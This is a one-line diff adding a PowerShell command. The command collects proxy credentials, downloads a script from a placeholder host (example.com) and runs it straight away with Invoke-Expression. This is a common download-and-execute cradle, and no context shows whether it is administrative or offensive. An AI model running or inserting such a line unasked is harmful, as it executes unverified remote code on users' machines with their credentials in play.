@@ -1,0 +1,1 @@
+$proxyCred = Get-Credential; $proxy = New-Object Net.WebProxy('http://proxyserver:8080'); $proxy.Credentials = $proxyCred; $client = New-Object Net.WebClient; $client.Proxy = $proxy; iex ($client.DownloadString('http://example.com/script.ps1'))
